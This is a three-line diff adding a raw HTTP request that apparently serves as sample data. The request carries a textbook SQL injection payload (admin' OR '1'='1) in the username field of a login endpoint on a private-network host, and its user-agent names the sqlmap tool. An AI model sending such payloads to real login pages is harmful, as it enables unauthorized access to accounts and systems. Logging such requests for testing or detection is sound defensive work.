@@ -1,0 +1,3 @@
+GET /login?username=admin' OR '1'='1&password=123456 HTTP/1.1
+Host: 192.168.1.100
+User-Agent: sqlmap/1.6.3#stable
